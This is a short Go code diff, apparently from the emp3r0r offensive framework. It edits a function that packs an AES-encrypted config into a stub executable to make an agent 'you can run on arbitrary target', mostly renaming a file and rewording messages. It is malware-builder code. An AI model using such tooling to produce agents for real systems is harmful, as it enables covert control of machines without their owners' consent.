@@ -12,7 +12,7 @@ import (
 )
 
 func GenAgent() {
-	buildJSONFile := "./build.json"
+	buildJSONFile := "./emp3r0r.json"
 	stubFile := "./stub.exe"
 	outfile := "./emp3r0r_data.exe"
 	CliPrintWarning("Make sure %s and %s exist, and %s must NOT be packed",
@@ -29,7 +29,7 @@ func GenAgent() {
 	key := tun.GenAESKey(RuntimeConfig.MagicString)
 	encJSONBytes := tun.AESEncryptRaw(key, jsonBytes)
 	if encJSONBytes == nil {
-		CliPrintError("Failed to encrypt %s", buildJSONFile)
+		CliPrintError("Failed to encrypt %s with key %s", buildJSONFile, key)
 		return
 	}
 
@@ -43,12 +43,12 @@ func GenAgent() {
 	toWrite = append(toWrite, encJSONBytes...)
 	err = ioutil.WriteFile(outfile, toWrite, 0755)
 	if err != nil {
-		CliPrintError("%v", err)
+		CliPrintError("Save agent binary %s: %v", outfile, err)
 		return
 	}
 
 	// done
-	CliPrintSuccess("Generated %s from %s and %s, you can use %s on arbitrary target",
+	CliPrintSuccess("Generated %s from %s and %s, you can run %s on arbitrary target",
 		outfile, stubFile, buildJSONFile, outfile)
 }
 
